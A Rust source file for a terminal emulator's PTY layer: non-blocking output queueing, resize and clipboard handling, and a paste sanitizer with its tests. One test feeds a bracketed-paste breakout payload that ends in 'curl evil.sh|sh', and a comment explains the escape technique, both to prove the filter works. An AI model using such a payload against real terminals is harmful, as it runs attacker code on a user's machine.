//! The core's side of the PTY: spawning and reaping the child, what it is sent (keys,
//! focus reports, pastes, query replies), and the output pumped from it, with the
//! bookkeeping each burst of output sets off. Every byte bound for the child goes through
//! one non-blocking queue, so a child that stops reading costs latency, never the window.

use std::os::fd::RawFd;
use std::time::{Duration, Instant};

use crate::app::message::ToWindow;
use crate::app::terminal::{PumpOutcome, TerminalCore};
use crate::error::Result;
use crate::gather::Gatherer;
use crate::grid::ClipboardTarget;
use crate::input;
use crate::pty::{Launch, Pty, ZombieChild};

/// How many bytes may sit queued for a child that is not reading.
///
/// The queue exists so a full PTY input buffer costs latency instead of the window (see
/// [`TerminalCore::pump_writes`]), but an unbounded queue just moves the failure from
/// "frozen" to "out of memory". A child can mint outbound bytes on its own — every
/// `\x1b[c` in its output is a device-attributes query the terminal answers — so this has
/// to be bounded by something other than the user's patience. The bound is checked before
/// a message is queued and a message is never cut (see [`enqueue`]), so a paste into a
/// queue with room always goes whole, however large, and the queue holds at most this
/// plus one message.
const OUT_QUEUE_MAX: usize = 1024 * 1024;

/// How much written prefix accumulates before the queue reclaims it. Compaction is a
/// memmove of what is left, so doing it per partial write would be quadratic against a
/// child that reads a few bytes at a time; doing it never would grow the buffer without
/// bound. 64 KiB bounds the waste and the copying at once.
const OUT_COMPACT_AT: usize = 64 * 1024;

/// The most capacity `key_buf` and an emptied `out_buf` keep. A paste of up to 16 MiB
/// grows both to its size; past this they give it back once the paste is queued and once
/// it is written, rather than holding it for the life of the tab. A reply batch is at
/// most 64 KiB, so ordinary traffic never shrinks and regrows.
const BUF_KEEP: usize = 64 * 1024;

/// How long the visual bell lasts. Long enough to catch the eye, short enough that a
/// program ringing the bell in a loop reads as a flicker and not a strobe. Only ever
/// seen while unfocused (see [`TerminalCore::after_output`]), so it is genuinely an "over here"
/// nudge, never feedback on your own keystrokes.
const BELL_FLASH: Duration = Duration::from_millis(120);

impl TerminalCore {
    /// Spawn the shell on a PTY sized to the current grid, returning the grid it
    /// was sized to (for the startup log), started as `launch` says. Only the live path calls
    /// this; demo mode never spawns a child. A gather thread is started on a
    /// duplicate of the master
    /// fd to drain the child's output; if it cannot start (no eventfd or thread,
    /// which on Linux means the process is already out of descriptors or threads),
    /// shell startup fails cleanly rather than limping on.
    pub(in crate::app) fn spawn_shell(&mut self, launch: &Launch) -> Result<(usize, usize)> {
        let (cols, rows) = self.screen.dimensions();
        self.spawn_pty(Pty::spawn(cols, rows, launch)?)
    }

    /// [`spawn_shell`](Self::spawn_shell) against an explicitly named program instead of
    /// `$SHELL`.
    ///
    /// Test-only, and it exists to keep the child out of the environment. `$SHELL` is
    /// process-global, so tests that reached for it were racing each other under the
    /// parallel runner: whichever set it last decided what *every* concurrently spawning
    /// test got, and a test wanting a child that exits at once would silently spawn one
    /// that never does. Naming the program is the fix the house rule already asks for —
    /// pass the state, do not stash it in a global.
    #[cfg(test)]
    pub(in crate::app) fn spawn_program(&mut self, argv: &[&str]) -> Result<(usize, usize)> {
        let (cols, rows) = self.screen.dimensions();
        self.spawn_pty(Pty::spawn_command(cols, rows, argv)?)
    }

    /// Attach an already-forked child: start its gather thread and seed the directory
    /// label. Shared by the live path and the tests, so both bring a tab up identically.
    fn spawn_pty(&mut self, pty: Pty) -> Result<(usize, usize)> {
        let (cols, rows) = self.screen.dimensions();
        self.shell_target = pty.target();
        let gatherer = match Gatherer::start(pty.fd(), pty.exit_fd()) {
            Ok(gatherer) => gatherer,
            Err(error) => {
                // Retain the successfully spawned PTY in the core so an owner
                // handling this startup error can still hang it up and reap it.
                self.pty = Some(pty);
                return Err(error);
            }
        };
        self.gatherer = Some(gatherer);
        self.pty = Some(pty);
        // Start the clock at the fork rather than at the first byte: the wait the user
        // sits through starts here, and a shell that is slow before it prints anything
        // is exactly the case worth catching.
        self.spawned_at = Some(Instant::now());
        // Seed the directory label so a fresh tab shows its cwd before the shell
        // has printed a thing.
        self.cwd = self.pty.as_ref().and_then(Pty::cwd);
        Ok((cols, rows))
    }

    /// Stop and join the gather thread, close the PTY master, and hand the child
    /// pid to the tabs layer for repeated nonblocking reaping. Demo and not-yet-
    /// spawned cores have no child.
    pub(in crate::app) fn into_child(mut self) -> Option<ZombieChild> {
        drop(self.gatherer.take());
        self.pty.take().map(Pty::into_zombie)
    }

    /// The fd for the event-loop `poll`: the gather thread's ready eventfd, which
    /// signals when the child produced output. `None` before the shell is spawned
    /// (and in demo mode).
    pub(in crate::app) fn poll_fd(&self) -> Option<RawFd> {
        self.gatherer.as_ref().map(Gatherer::ready_fd)
    }

    /// Whether this core still has published gather batches waiting to be parsed.
    pub(in crate::app) fn has_pending(&self) -> bool {
        self.gatherer.as_ref().is_some_and(Gatherer::has_pending)
    }

    /// Re-read the tty's line discipline, and repaint if it changed. This is the only
    /// way a password prompt can be noticed: `sudo` prints no escape sequence to
    /// announce itself, it just clears `ECHO` on the tty and writes an ordinary line
    /// of text, so the signal is out of band and has to be fetched (see
    /// [`Pty::tty_mode`]).
    ///
    /// A tty whose mode cannot be read (demo mode, or a child that has exited) keeps
    /// the last mode seen rather than snapping back to `Cooked`, so a dying shell
    /// cannot flicker the cursor on its way out.
    pub(in crate::app) fn refresh_tty_mode(&mut self) {
        let Some(mode) = self.pty.as_ref().and_then(Pty::tty_mode) else {
            return;
        };
        if mode != self.tty_mode {
            self.tty_mode = mode;
            self.dirty = true;
        }
    }

    /// Test-only direct feed through the same parser/output bookkeeping used by
    /// gather batches, for manager routing tests that do not need a real child.
    #[cfg(test)]
    pub(in crate::app) fn feed_test_bytes(&mut self, bytes: &[u8]) {
        self.parser.advance_bytes(&mut self.screen, bytes);
        self.after_output();
    }

    /// Encode a key press or release for the child and send it. Returns whether it
    /// produced bytes, which is what gates auto-repeat: a chord the child never hears
    /// about must not repeat.
    pub(in crate::app) fn key(
        &mut self,
        key: input::Key,
        mods: input::Mods,
        event: input::KeyEvent,
    ) -> Result<bool> {
        let modes = input::Modes::from_screen(&self.screen);
        self.key_buf.clear();
        input::encode_event(key, mods, event, modes, &mut self.key_buf);
        if self.key_buf.is_empty() {
            return Ok(false);
        }
        // Typing ends the selection. Gated on the encoder having produced
        // something, so a key the child will never hear about leaves it alone,
        // and so do the chords the window swallows before this seam: local
        // scrollback keys, tab switching, and Ctrl+Shift+C itself, which would
        // otherwise wipe the selection it was pressed to copy.
        //
        // A *release* is excluded, and must be. Under kitty's
        // `REPORT_EVENT_TYPES` a release encodes to bytes of its own, and
        // `App::on_key_release` forwards one for every key whose press a binding
        // consumed — so counting releases as typing would have letting go of
        // Ctrl+Shift+C undo the copy that pressing it just made.
        if event != input::KeyEvent::Release {
            self.end_selection_on_input();
        }
        self.snap_to_bottom();
        self.bump_cursor(); // keep the cursor solid while typing
        self.send_key_buf()?;
        Ok(true)
    }

    /// Keyboard focus gained or lost. The window observes it (Wayland); the terminal
    /// needs it because the cursor draws solid when focused and hollow when not.
    pub(in crate::app) fn focus(&mut self, focused: bool) -> Result<()> {
        self.focused = focused;
        // `?1004`: the child asked to be told. Flushed straight away — a focus
        // change need not be followed by any output, so waiting for the next pump
        // could sit on it indefinitely.
        self.screen.report_focus(focused);
        self.flush_responses()?;
        if focused {
            self.bump_cursor(); // start blinking from a lit cursor
        } else {
            self.blink_at = None; // stop the blink timer while unfocused
        }
        self.dirty = true;
        Ok(())
    }

    /// Paste `bytes` as input: bracketed when the program asked for it (`?2004`), always
    /// filtered, and snapped to the live bottom like typing.
    pub(in crate::app) fn paste(&mut self, bytes: Vec<u8>) -> Result<()> {
        let text = String::from_utf8_lossy(&bytes);
        if text.is_empty() {
            return Ok(());
        }
        // Build the paste straight into the reused key buffer: bracketed-paste
        // markers when the program enabled them (`?2004`), and the text folded
        // and filtered by `sanitize_paste`. The filter runs whether or not the
        // brackets do — a control character is no more welcome in a raw paste —
        // and it is what keeps the payload from closing the bracket we just
        // opened. Snaps the view to the bottom, like input.
        let bracketed = self.screen.bracketed_paste();
        self.key_buf.clear();
        if bracketed {
            self.key_buf.extend_from_slice(b"\x1b[200~");
        }
        sanitize_paste(&mut self.key_buf, &text);
        if bracketed {
            self.key_buf.extend_from_slice(b"\x1b[201~");
        }
        // A paste is input like any other, so it ends the selection too. It costs
        // the middle-click-repeatedly workflow nothing: the primary offer was
        // handed to the window when the drag ended and stands on its own, so the
        // highlight going away does not retract what middle-click pastes.
        self.end_selection_on_input();
        self.snap_to_bottom();
        let sent = self.send_key_buf();
        if self.key_buf.capacity() > BUF_KEEP {
            self.key_buf.clear();
            self.key_buf.shrink_to(BUF_KEEP);
        }
        sent
    }

    /// Drain published child output through the parser until `max_bytes` or
    /// `deadline` is reached. The tab manager shares those limits across every
    /// core in a turn. Query responses are flushed after each batch, and the end
    /// marker is reported only after the gather queue is empty, so teardown never
    /// drops bytes that were already read. At that end marker a UTF-8 character split
    /// across the final read is flushed to U+FFFD (see [`Parser::finish`](crate::vt::Parser::finish)),
    /// since no further read can complete it. A no-op before a shell is spawned.
    pub(in crate::app) fn pump(
        &mut self,
        max_bytes: usize,
        deadline: Instant,
    ) -> Result<PumpOutcome> {
        let Some(gatherer) = &self.gatherer else {
            return Ok(PumpOutcome {
                bytes: 0,
                more: false,
                end: None,
            });
        };
        // Drain the wake eventfd once per pump; a publish that races this still
        // re-arms it (empty→nonempty), so the next poll returns and we catch it.
        //
        // Unconditional, including on turns woken only by pointer motion, which is one
        // `read(2)` per tab per turn that usually finds nothing. Considered and kept:
        // skipping it when no batch is ready inverts the race — a turn woken *by* the
        // eventfd that then finds the batch already consumed would leave it armed and
        // spin. The syscall is the cheap side of that trade.
        gatherer.clear_wakeup();

        let mut consumed_bytes = 0usize;
        let mut consumed_any = false;
        while consumed_bytes < max_bytes && Instant::now() < deadline {
            let Some(batch) = self.gatherer.as_ref().and_then(|g| g.next_batch()) else {
                break;
            };
            let n = {
                let data = batch.bytes();
                self.parser.advance_bytes(&mut self.screen, data);
                data.len()
            };
            drop(batch); // return the buffer to the pool before anything else
            consumed_bytes += n;
            consumed_any = true;
            // Answer any query the child made in this batch (DA/DSR) promptly,
            // rather than after the whole queue: parsing 64 KiB is well under a
            // millisecond, so this bounds reply latency while keeping batching.
            self.flush_responses()?;
        }
        // The end marker is withheld until the ready queue drains, so this only
        // fires once every buffered byte has reached the grid.
        let (end, more) = match &self.gatherer {
            Some(g) => (g.completion(), g.has_pending()),
            None => (None, false),
        };
        // A genuine end of stream (the child exited, or the read failed) is the one
        // moment a UTF-8 sequence held across the last read boundary can never be
        // completed: there is no next read to bring its continuation. Flush it to
        // U+FFFD now instead of dropping it silently. An ordinary read boundary never
        // reaches here, so a character split across two reads is still held.
        if end.is_some() {
            consumed_any |= self.parser.finish(&mut self.screen);
        }
        if consumed_any {
            self.after_output();
        }

        Ok(PumpOutcome {
            bytes: consumed_bytes,
            more,
            end,
        })
    }

    /// Send whatever the encoders just built in `key_buf`: a keystroke, a paste, a mouse
    /// report, a scroll. One hand-off, whether it is three bytes or a megabyte.
    pub(super) fn send_key_buf(&mut self) -> Result<()> {
        if self.key_buf.is_empty() {
            return Ok(());
        }
        enqueue(&mut self.out_buf, self.out_head, &self.key_buf);
        self.pump_writes()
    }

    /// Push as much of the outbound queue as the child will take, right now.
    ///
    /// **This never blocks, and that is the whole design.** It used to, and that was a
    /// way to freeze the entire window from bytes alone. The write happens on the one
    /// thread that also renders, dispatches Wayland and delivers keys, so waiting for a
    /// full input buffer to drain stops all four — and nothing guarantees it ever
    /// drains, because the thing that has to read is the child. A child that is not
    /// reading (`sleep 60`, anything compute-bound, `cat` pouring out a file) plus enough
    /// bytes to fill the ~4 KB the line discipline holds was a dead terminal: no repaint,
    /// no keystrokes, no Ctrl+C (key delivery is on this thread too), and no
    /// `xdg_wm_base.pong`, so the compositor greyed the window out as unresponsive. The
    /// gather thread could not rescue it either, because free buffers return to its pool
    /// only through `Batch::drop`, which runs here.
    ///
    /// Reaching that state needed nothing from the user. Replies are queued while parsing
    /// and flushed from inside the drain loop, so a file full of `\x1b[c` mints its own
    /// outbound flood (each one a device-attributes query we answer) while the `cat`
    /// printing it never reads stdin, so nothing drains it. Hence also [`OUT_QUEUE_MAX`]:
    /// not blocking is only half the fix if the queue can grow forever instead.
    ///
    /// Called for every tab that owes bytes on every turn, whether or not `poll` named
    /// it. The write is a single syscall that returns `EAGAIN` when there is no room,
    /// which is cheaper than threading poll slots back to their tabs.
    pub(in crate::app) fn pump_writes(&mut self) -> Result<()> {
        let Some(pty) = &self.pty else {
            // Demo mode, or a tab whose child is gone: there is nobody to write to, and
            // holding the bytes would keep the fd registered for a wake that never comes.
            self.empty_out_buf();
            return Ok(());
        };
        while self.out_head < self.out_buf.len() {
            let n = pty.write_some(&self.out_buf[self.out_head..])?;
            if n == 0 {
                break; // EAGAIN: the child's input buffer is full
            }
            self.out_head += n;
        }
        if self.out_head == self.out_buf.len() {
            self.empty_out_buf();
        } else if self.out_head >= OUT_COMPACT_AT {
            // Reclaim the written prefix. Deferred to a threshold so a stalled child
            // costs one memmove per that many bytes, not one per partial write.
            self.out_buf.drain(..self.out_head);
            self.out_head = 0;
        }
        Ok(())
    }

    /// Empty the outbound queue, keeping at most [`BUF_KEEP`] of its capacity.
    fn empty_out_buf(&mut self) {
        self.out_buf.clear();
        self.out_buf.shrink_to(BUF_KEEP);
        self.out_head = 0;
    }

    /// Whether this tab still owes the child bytes, so the event loop should watch its
    /// master for `POLLOUT` and come back.
    pub(in crate::app) fn wants_write(&self) -> bool {
        self.out_head < self.out_buf.len()
    }

    /// The master fd to watch for writability, for a tab that owes bytes.
    pub(in crate::app) fn write_fd(&self) -> Option<RawFd> {
        if !self.wants_write() {
            return None;
        }
        self.pty.as_ref().map(Pty::fd)
    }

    /// Queue any query replies (DA/DSR) the grid produced while parsing.
    ///
    /// Appended straight from the grid's own buffer rather than copied out: that keeps
    /// the reply buffer and its capacity, which is the point of `clear_responses` over
    /// taking it, and [`enqueue`] is a free function precisely so the borrow works.
    fn flush_responses(&mut self) -> Result<()> {
        if self.screen.responses().is_empty() {
            return Ok(());
        }
        enqueue(&mut self.out_buf, self.out_head, self.screen.responses());
        self.screen.clear_responses();
        self.pump_writes()
    }

    /// The bookkeeping every burst of child output triggers: drop the selection if the
    /// output invalidated it, re-probe the link under a parked pointer (the text under it
    /// just moved), show the cursor solid, mark dirty, and refresh the title if the child
    /// changed it.
    ///
    /// Output deliberately moves neither the view nor the selection. A scrolled-back view
    /// stays anchored to its content while the child prints
    /// ([`Screen::follow_history`](crate::grid::Screen::follow_history)), and the
    /// selection is held in absolute rows so the text under it keeps its identity as the
    /// grid scrolls beneath it. Only the user returns the view to the live bottom (by
    /// typing, pasting, or pressing End). Output ends a selection only on a genuine loss
    /// of row identity (see [`Self::prune_selection`]); what *does* end one outright is
    /// the user sending the child input (see [`Self::end_selection_on_input`]).
    pub(super) fn after_output(&mut self) {
        self.prune_selection();
        self.refresh_hover();
        self.bump_cursor();
        self.dirty = true;
        self.refresh_title();
        self.track_sync_lock();
        self.flush_clipboard_writes();
        // The bell is an attention signal, and it can only signal something you are not
        // already watching: while the surface holds focus you are the one driving the
        // child (a shell tab-completing against nothing rings it constantly), so a flash
        // there is pure noise. Swallow it when focused; flash only to pull the eye back to
        // a window you are not looking at. `take_bell` still runs so the flag never
        // accrues across a focus change.
        if self.screen.take_bell() && !self.focused {
            self.bell_until = Some(Instant::now() + BELL_FLASH);
        }
    }

    /// How long the shell took to reach its first prompt, answered once and only once,
    /// the first time this is called after that prompt's `OSC 133;A` has landed.
    ///
    /// Reading the grid's prompt marks rather than watching the byte stream keeps the
    /// parser and the grid unaware of any of this: the mark is already recorded for the
    /// reflow freeze, and "has this shell ever marked a prompt" is a question the screen
    /// can already answer.
    pub(in crate::app) fn take_startup_time(&mut self) -> Option<Duration> {
        let spawned = self.spawned_at?;
        if self.screen.prompts().is_empty() {
            return None;
        }
        self.spawned_at = None;
        Some(spawned.elapsed())
    }

    /// Push the debounced resize to the child once it has settled: `TIOCSWINSZ`
    /// (→ `SIGWINCH`) at the grid's current size, plus the in-band `?2048` report for the
    /// child that asked. Best-effort: a resize on a dead child just surfaces as EOF on the
    /// next read. The grid was already reflowed when the resize arrived; this is only the
    /// child notification, held back so a drag does not flood it. See
    /// [`resize_settle`](crate::app::terminal::resize_settle).
    pub(in crate::app) fn flush_winsize_if_due(
        &mut self,
        now: Instant,
    ) -> crate::error::Result<()> {
        if self.winsize_at.is_some_and(|at| at <= now) {
            self.winsize_at = None;
            let (cols, rows) = self.screen.dimensions();
            if let Some(pty) = &self.pty {
                let _ = pty.resize(cols, rows);
            }
            self.screen.report_size();
            self.flush_responses()?;
        }
        Ok(())
    }

    /// When the debounced resize is due to reach the child, for the event-loop wait.
    pub(in crate::app) fn winsize_deadline(&self) -> Option<Instant> {
        self.winsize_at
    }

    /// Hand the child's `OSC 52` clipboard writes to the window, which owns the Wayland
    /// data device. The same outbox the select-to-copy path uses: from here on it is
    /// indistinguishable from the user having copied the text themselves, which is the
    /// point — the terminal is the only process in the pipeline that is actually on the
    /// user's desktop.
    fn flush_clipboard_writes(&mut self) {
        for (target, bytes) in self.screen.take_clipboard_writes() {
            self.outbox.push(match target {
                ClipboardTarget::Clipboard => ToWindow::OfferSelection(bytes),
                ClipboardTarget::Primary => ToWindow::OfferPrimary(bytes),
            });
        }
    }

    /// Queue a `Title` for the window when the child's title changed since the last
    /// one emitted. Deduping here (on the sender) keeps a busy child from pushing a
    /// title every chunk, and it maps the empty title to the app name for display.
    fn refresh_title(&mut self) {
        if self.screen.title() == self.last_title {
            return;
        }
        self.last_title.clear();
        self.last_title.push_str(self.screen.title());
        let shown = self.title().to_string();
        self.outbox.push(ToWindow::Title(shown));
    }
}

/// Append one message (a keystroke, a paste, a mouse report, a batch of replies) to a
/// tab's outbound queue whole, or drop it whole once [`OUT_QUEUE_MAX`] bytes are already
/// owed. `head` is how far the queue has already been written.
///
/// A message is never cut. Half a key sequence or reply is a malformed escape sequence in
/// the child's input, and a bracketed paste cut short loses its closing `ESC [ 201 ~`,
/// which leaves the shell treating every later keystroke as pasted text. The check comes
/// before the append, so the queue can overshoot the cap by one message; each message is
/// bounded where it is made (a paste by `PASTE_MAX`, a reply batch by `RESPONSE_MAX`).
///
/// A free function rather than a method so the caller can pass a slice borrowed from
/// another of its own fields (the grid's reply buffer) without the borrow checker
/// seeing a conflict.
fn enqueue(out: &mut Vec<u8>, head: usize, message: &[u8]) {
    if out.len() - head < OUT_QUEUE_MAX {
        out.extend_from_slice(message);
    }
}

/// Append `text` to `out` as the bytes a paste is allowed to deliver: printable text,
/// with every line ending folded to a single carriage return and every control
/// character dropped.
///
/// **Folding.** A pasted newline reaches the child as CR, so a bare LF becomes CR and a
/// CRLF collapses to one CR (its LF swallowed) rather than arriving doubled; a lone CR
/// stays one CR.
///
/// **Filtering.** Everything else in C0, plus DEL and the whole C1 block, is dropped.
/// Tab is the one control that survives, because it is text people paste on purpose.
///
/// The filter is a security boundary, not tidiness. Pasted bytes are attacker-reachable
/// without any clipboard cooperation: OSC 52 *writes* are accepted, so `cat`ing a
/// hostile file, or a log line or compiler error quoting attacker text, can plant a
/// payload in the real clipboard that the user's own Ctrl+Shift+V then detonates. An
/// `ESC` surviving into a bracketed paste lets the payload close the `\x1b[201~` bracket
/// this terminal opened: readline takes the following CR as a real Enter, runs what came
/// before it, and treats the rest as ordinary keystrokes. One pasted line, two executed
/// commands, and the second never shown as pasted text. xterm ships the same defence as
/// `disallowedPasteControls`; foot strips C0 other than tab, CR and LF, which is what
/// this does.
///
/// Note what this cannot cover: with `?2004` off there are no brackets to break out of,
/// so an embedded CR still submits its line. xterm behaves the same way, and it is the
/// reason bracketed paste exists.
///
/// One pass straight into the caller's reused buffer, no intermediate `String`.
fn sanitize_paste(out: &mut Vec<u8>, text: &str) {
    let bytes = text.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'\r' => {
                out.push(b'\r');
                if bytes.get(i + 1) == Some(&b'\n') {
                    i += 1;
                }
            }
            b'\n' => out.push(b'\r'),
            b'\t' => out.push(b'\t'),
            // The rest of C0, and DEL. ESC is the dangerous one (it closes the paste
            // bracket); NUL, BS and DEL are xterm's other defaults and edit the line.
            0x00..=0x1f | 0x7f => {}
            // The C1 block, which arrives here as its two-byte UTF-8 encoding because
            // the caller has already lossily decoded the clipboard's bytes. A raw 0x9b
            // is the single-byte CSI, so it closes a bracket exactly as ESC `[` does.
            0xc2 if bytes.get(i + 1).is_some_and(|b| (0x80..=0x9f).contains(b)) => i += 1,
            b => out.push(b),
        }
        i += 1;
    }
}

#[cfg(test)]
mod tests {
    use crate::app::terminal::io::*;
    use crate::app::terminal::tests::{core_80x24, geom};

    #[test]
    fn paste_folds_every_newline_shape_to_one_cr() {
        let mut out = Vec::new();
        // CRLF, bare LF, and lone CR all become a single CR; other bytes pass through.
        sanitize_paste(&mut out, "a\r\nb\nc\rd");
        assert_eq!(out, b"a\rb\rc\rd");
        // A trailing CRLF collapses to one CR (its LF swallowed), not two.
        out.clear();
        sanitize_paste(&mut out, "line\r\n");
        assert_eq!(out, b"line\r");
        // Multibyte UTF-8 is copied verbatim.
        out.clear();
        sanitize_paste(&mut out, "héllo 日本");
        assert_eq!(out, "héllo 日本".as_bytes());
    }

    #[test]
    fn a_child_that_never_reads_cannot_freeze_the_terminal() {
        // The freeze, reproduced against a real non-reading child. `sleep` never touches
        // its stdin, so the ~4 KB the line discipline holds fills and stays full. The old
        // write blocked here with an infinite `poll(POLLOUT)` on the one thread that also
        // renders, dispatches Wayland and delivers keys: no repaint, no Ctrl+C, and no
        // `pong`, so the compositor greyed the window out too.
        let mut core = core_80x24(false);
        if core.spawn_program(&["/bin/sleep", "30"]).is_err() {
            eprintln!("pty spawn unavailable in this environment; skipping");
            return;
        }

        // Pastes far larger than any input buffer. Each call must *return*; the bug is
        // that it did not, so the failure mode being guarded against is this test hanging
        // rather than failing. Several of them, because how much the line discipline
        // swallows before it pushes back is the kernel's business, not ours.
        let big = "x".repeat(256 * 1024);
        let start = Instant::now();
        for _ in 0..24 {
            core.paste(big.clone().into_bytes()).expect("paste");
        }
        assert!(
            start.elapsed() < Duration::from_secs(5),
            "a paste blocked on a child that will never read"
        );

        // Whatever the child would not take is owed, not lost, and never unbounded: the
        // cap is checked before a paste is queued, so it overshoots by one paste at most.
        let owed = core.out_buf.len() - core.out_head;
        assert!(
            owed < OUT_QUEUE_MAX + big.len(),
            "the queue is capped at {OUT_QUEUE_MAX} plus one paste, holding {owed}"
        );
        assert_eq!(
            core.wants_write(),
            core.write_fd().is_some(),
            "a tab that owes bytes names the fd to watch, and one that does not, does not"
        );

        // And the terminal is still live: it accepts and acts on an event, which is
        // precisely what the frozen version could not do.
        core.dirty = false;
        core.focus(true).expect("focus");
        assert!(core.dirty, "the window still responds");
    }

    #[test]
    fn a_message_is_queued_whole_or_not_at_all() {
        // The cap's semantics on their own, with no kernel in the way. A message that
        // starts below the cap goes in whole, even past it: cutting it would hand the
        // child half an escape sequence, or a paste without its closing bracket.
        let mut out = Vec::new();
        enqueue(&mut out, 0, &vec![b'a'; OUT_QUEUE_MAX - 4]);
        enqueue(&mut out, 0, b"bbbbbbbb");
        assert_eq!(out.len(), OUT_QUEUE_MAX + 4, "overshoots by one message");
        assert!(out.ends_with(b"bbbbbbbb"));

        // Once the cap is owed, the next message is dropped whole.
        enqueue(&mut out, 0, b"cccc");
        assert_eq!(
            out.len(),
            OUT_QUEUE_MAX + 4,
            "a full queue takes nothing more"
        );

        // `head` is what has already gone to the child, so it frees budget: the queue is
        // bounded by what is still *owed*, not by everything ever written.
        enqueue(&mut out, 8, b"dddd");
        assert!(out.ends_with(b"dddd"));

        // A paste larger than the cap still goes whole into a queue with room.
        let mut out = Vec::new();
        enqueue(&mut out, 0, &vec![b'p'; 2 * OUT_QUEUE_MAX]);
        assert_eq!(out.len(), 2 * OUT_QUEUE_MAX);
    }

    #[test]
    fn a_large_paste_reaches_a_reading_child_whole() {
        // A 2 MiB bracketed paste into a child that reads everything. The queue used to
        // keep only its first 1 MiB before the first write, so the rest and the closing
        // `ESC [ 201 ~` never arrived and the shell stayed in paste mode. Raw mode, since
        // canonical mode caps a line at 4095 bytes; the child reports the last six bytes
        // it received, which must be the closing bracket.
        let mut core = core_80x24(false);
        let payload = 2 * 1024 * 1024;
        let total = b"\x1b[200~".len() + payload + b"\x1b[201~".len();
        let script = format!(
            "stty raw -echo; echo ready; head -c {total} | tail -c 6 | od -An -tx1 | tr -d ' \\n'; echo; sleep 1"
        );
        if core.spawn_program(&["/bin/sh", "-c", &script]).is_err() {
            eprintln!("pty spawn unavailable in this environment; skipping");
            return;
        }
        let screen_has = |core: &TerminalCore, needle: &str| {
            (0..24).any(|row| core.row_string(row).contains(needle))
        };
        let deadline = Instant::now() + Duration::from_secs(10);
        while !screen_has(&core, "ready") {
            assert!(Instant::now() < deadline, "the child never came up");
            let _ = core.pump(1 << 20, Instant::now() + Duration::from_millis(20));
            std::thread::sleep(Duration::from_millis(5));
        }

        core.feed_test_bytes(b"\x1b[?2004h");
        core.paste(vec![b'x'; payload]).expect("paste");
        while !screen_has(&core, "1b5b3230317e") {
            assert!(
                Instant::now() < deadline,
                "the child never received the whole paste and its closing bracket"
            );
            core.pump_writes().expect("write");
            let _ = core.pump(1 << 20, Instant::now() + Duration::from_millis(20));
            std::thread::sleep(Duration::from_millis(1));
        }
        assert!(
            core.out_buf.capacity() <= BUF_KEEP,
            "the written queue kept {} bytes",
            core.out_buf.capacity()
        );
        let _ = core.into_child();
    }

    /// A paste grows the key buffer and the outbound queue to its size. Kept, one 16 MiB
    /// paste would stay held for the life of the tab.
    #[test]
    fn a_large_paste_gives_its_size_back() {
        let mut core = core_80x24(true);
        core.paste(vec![b'x'; 2 * 1024 * 1024]).expect("paste");
        assert!(
            core.key_buf.capacity() <= BUF_KEEP,
            "key_buf kept {} bytes",
            core.key_buf.capacity()
        );
        assert!(
            core.out_buf.capacity() <= BUF_KEEP,
            "out_buf kept {} bytes",
            core.out_buf.capacity()
        );
    }

    #[test]
    fn a_paste_cannot_close_the_bracket_the_terminal_opened() {
        // The attack, end to end through the real writer. The payload carries its own
        // `\x1b[201~`; if it survives, readline sees the paste end early, takes the
        // following CR as a real Enter and runs `echo hi`, then receives the rest as
        // ordinary typing and the next CR executes *that*. One pasted line, two commands,
        // and the second never displayed as pasted text.
        let mut core = core_80x24(true);
        core.feed_test_bytes(b"\x1b[?2004h"); // the program wants bracketed paste
        let payload = "echo hi\x1b[201~\ncurl evil.sh|sh\n";
        core.paste(payload.as_bytes().to_vec()).expect("paste");

        let sent = core.key_buf.clone();
        assert_eq!(
            sent.windows(6).filter(|w| *w == b"\x1b[201~").count(),
            1,
            "exactly one paste-end marker, the one we wrote: {:?}",
            String::from_utf8_lossy(&sent)
        );
        // Only the ESC is removed; `[201~` stays as the printable text it now is. That
        // is deliberate, and what xterm and foot do: the paste is inert either way, and
        // silently swallowing the rest of the sequence would hide characters the user
        // really did paste.
        assert_eq!(
            sent,
            b"\x1b[200~echo hi[201~\rcurl evil.sh|sh\r\x1b[201~".to_vec(),
            "the ESC is dropped and the text arrives as one inert paste"
        );
    }

    #[test]
    fn a_paste_delivers_text_and_tabs_but_no_other_control_bytes() {
        let mut out = Vec::new();
        // NUL, BS, ESC and DEL are xterm's `disallowedPasteControls`; all of C0 goes
        // except the two line endings (folded above) and tab, which is real text.
        sanitize_paste(&mut out, "a\0b\x08c\x1bd\x7fe\x07f");
        assert_eq!(out, b"abcdef");
        out.clear();
        sanitize_paste(&mut out, "col1\tcol2");
        assert_eq!(out, b"col1\tcol2", "tab is text people paste on purpose");

        // The C1 block reaches here as two-byte UTF-8, since the clipboard's bytes are
        // lossily decoded before this. U+009B is the single-byte CSI: left in, it opens
        // a control sequence with no ESC in sight.
        out.clear();
        sanitize_paste(&mut out, "a\u{9b}201~b\u{85}c");
        assert_eq!(out, b"a201~bc");
        // A 0xc2 that is *not* leading a C1 is an ordinary Latin-1 character and stays.
        out.clear();
        sanitize_paste(&mut out, "café ©");
        assert_eq!(out, "café ©".as_bytes());
    }

    #[test]
    fn the_startup_clock_answers_once_and_only_after_a_prompt_mark() {
        // The contract the corner notice rests on. Before the shell marks a prompt there
        // is no answer at all — not a zero, not a guess from output bytes — because until
        // then the terminal genuinely does not know whether a prompt has appeared.
        let mut core = core_80x24(true);
        core.spawned_at = Some(Instant::now() - Duration::from_millis(120));
        assert_eq!(
            core.take_startup_time(),
            None,
            "output alone says nothing; only a prompt mark does"
        );
        core.feed_test_bytes(b"printing away, still no prompt\r\n");
        assert_eq!(core.take_startup_time(), None);

        core.feed_test_bytes(b"\x1b]133;A\x07");
        let took = core.take_startup_time().expect("the mark stops the clock");
        assert!(
            took >= Duration::from_millis(120),
            "measured from the fork, not from the first byte: {took:?}"
        );
        // Once and only once: a shell marks a prompt before every command it runs, and a
        // notice per prompt would be a notice per command.
        assert_eq!(core.take_startup_time(), None, "answered once");
        core.feed_test_bytes(b"\x1b]133;A\x07");
        assert_eq!(core.take_startup_time(), None, "and stays answered");
    }

    #[test]
    fn a_shell_that_never_marks_a_prompt_is_never_measured() {
        // The no-integration case, which must stay silent rather than guess. A shell with
        // no OSC 133 prints plenty and marks nothing, and a terminal that timed *that*
        // would be warning about programs that are not prompts.
        let mut core = core_80x24(true);
        core.spawned_at = Some(Instant::now() - Duration::from_secs(30));
        core.feed_test_bytes(b"$ ls\r\nCargo.toml  src\r\n$ ");
        assert_eq!(
            core.take_startup_time(),
            None,
            "30 seconds of output is still not a prompt anyone marked"
        );
    }

    #[test]
    fn a_live_child_marking_a_prompt_stops_the_startup_clock() {
